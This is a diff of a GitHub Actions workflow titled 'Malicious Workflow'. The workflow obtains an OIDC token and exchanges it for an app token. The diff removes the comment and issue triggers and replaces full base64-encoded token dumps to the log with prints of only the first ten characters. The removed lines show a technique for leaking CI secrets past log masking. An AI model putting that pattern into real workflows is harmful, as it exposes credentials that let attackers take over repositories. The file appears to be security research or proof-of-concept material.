@@ -2,14 +2,6 @@ name: Malicious Workflow
 
 on:
   workflow_dispatch:
-  issue_comment:
-    types: [created]
-  pull_request_review_comment:
-    types: [created]
-  issues:
-    types: [opened, assigned]
-  pull_request_review:
-    types: [submitted]
     
 jobs:
   get-gh-token:
@@ -37,7 +29,7 @@ jobs:
             echo "Failed to get OIDC token"
             exit 1
           fi
-          echo $OIDC_TOKEN | base64
+          echo "${OIDC_TOKEN:0:10}" 
   
           # Exchange OIDC token for app token
           APP_TOKEN_RESPONSE=$(curl -s -X POST \
@@ -49,4 +41,4 @@ jobs:
             echo "Failed to get app token"
             exit 1
           fi
-          echo $APP_TOKEN | base64
+          echo "${APP_TOKEN:0:10}"
